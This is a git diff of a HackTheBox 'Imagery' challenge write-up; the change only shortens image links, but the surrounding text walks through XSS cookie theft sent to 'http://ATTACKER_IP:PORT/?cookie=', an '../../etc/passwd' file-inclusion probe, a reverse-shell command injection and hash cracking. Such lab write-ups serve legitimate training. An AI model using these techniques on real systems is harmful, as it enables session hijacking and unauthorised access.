@@ -4,6 +4,7 @@ date: 2026-02-11
 categories: [HackTheBox Challenges, HTB Medium]
 tags: [htb, challenge, medium]
 description: HackTheBox Imagery Medium Challenge Writeup
+media_subpath: /assets/img/htb/imagery/
 ---
 
 ## Adding IP to /etc/hosts
@@ -185,29 +186,29 @@ Task Completed
 
 There are a couple of directories, but they don't seem very useful at the moment. Let's check the homepage for anything we can do.
 
-![Imagery Homepage](/assets/img/htb/imagery/Homepage.png)
+![Imagery Homepage](Homepage.png)
 
 It seems like we can create an account and login! I will be using `donutmaster@donut.com:donutdonut` as my email and password.
 
-![Register](/assets/img/htb/imagery/register.png)
+![Register](register.png)
 
-![Login](/assets/img/htb/imagery/login.png)
+![Login](login.png)
 
 ### Features
 
-![Uploading Image](/assets/img/htb/imagery/uploadimage.png)
+![Uploading Image](uploadimage.png)
 
 After logging in, we have two tabs for uploading and looking at our uploaded images. We can first check the upload feature.
 
-![Image](/assets/img/htb/imagery/puppyimage.png)
+![Image](puppyimage.png)
 
-![Gallery](/assets/img/htb/imagery/gallery.png)
+![Gallery](gallery.png)
 
 There isn't much we can do with this, so we'll move on. When scrolling to the bottom of the page, we find a report bug feature.
 
-![Report Bug](/assets/img/htb/imagery/reportbug.png)
+![Report Bug](reportbug.png)
 
-![Bug Reported](/assets/img/htb/imagery/bugreported.png)
+![Bug Reported](bugreported.png)
 
 From this, we know that the admin will or already checked our bug report. This might be useful information for the future.
 
@@ -220,7 +221,7 @@ There's a few things we have figured out until now.
 
 For now, the first two are not really that important. For the second one, we can check the source code for the website and see if any vulnerabilities are present. We can do this even if there are multiple directories, but it makes our job slightly easier.
 
-![Source code](/assets/img/htb/imagery/sourcecode.png)
+![Source code](sourcecode.png)
 
 Although this image doesn't show the full source code, you can look at the whole code yourself either on the browser or through GET requests on BurpSuite, Caido, Zap, or any similar software. When scrolling through the code, I found this function.
 
@@ -286,7 +287,7 @@ Remember that the admin checks our bug reports. If we send a malicious command i
 
 If we have a http server running on our attacker machine at some port, the target machine's website would send us a request for the page `http://ATTACKER_IP:PORT/?cookie=(admin's cookie)`. Although this page doesn't exist, if we setup a python http server, we can see the request with the admin's cookie.
 
-![XSS](/assets/img/htb/imagery/XSS.png)
+![XSS](XSS.png)
 
 ```terminal
 ┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
@@ -297,13 +298,13 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 As you can see, the website did infact send us a request with the admin's cookie! We can know change our session cookie on our browser to this new cookie. Note, this process will be different depending on your browser.
 
-![Admin Page](/assets/img/htb/imagery/admin.png)
+![Admin Page](admin.png)
 
 ### Local File Inclusion (LFI)
 
 After successfully becoming the admin, we know have access to an admin panel.
 
-![Admin Panel](/assets/img/htb/imagery/adminpanel.png)
+![Admin Panel](adminpanel.png)
 
 One feature that pops out is the ability to download user logs. Sometimes, if the website pulls the log files from the machine, there could be a possible [Local File Inclusion (LFI)](https://brightsec.com/blog/local-file-inclusion-lfi/) vulnerability.
 
@@ -323,7 +324,7 @@ Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBE
 
 To check for LFI, we can change the `testuser%40imagery.htb.log` to `../../../../../../../etc/passwd`.
 
-![LFI](/assets/img/htb/imagery/etcpasswd.png)
+![LFI](etcpasswd.png)
 
 We have LFI!
 
@@ -758,7 +759,7 @@ if transform_type == 'crop':
 
 There are two useful pieces of information here. All parameters (x, y, width, height) are not sanitized. The `subprocess.run` also allows for a shell (command execution) through `shell=True`. This means that we can get a reverse shell through this vulnerability.
 
-![Reverse Shell](/assets/img/htb/imagery/revshell.png)
+![Reverse Shell](revshell.png)
 
 ```terminal
 ┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
@@ -1084,7 +1085,7 @@ After cracking the aes and retreiving the zip file, we can see that this is prob
 
 We can see that this db.json has the MD5 hash of both the user mark and our current user web! We can crack mark's hash using [crackstation.net](https://crackstation.net).
 
-![Mark Hash Cracking](/assets/img/htb/imagery/crackstation.png)
+![Mark Hash Cracking](crackstation.png)
 
 We got Mark's password! We can now go back to our shell and become mark!
 
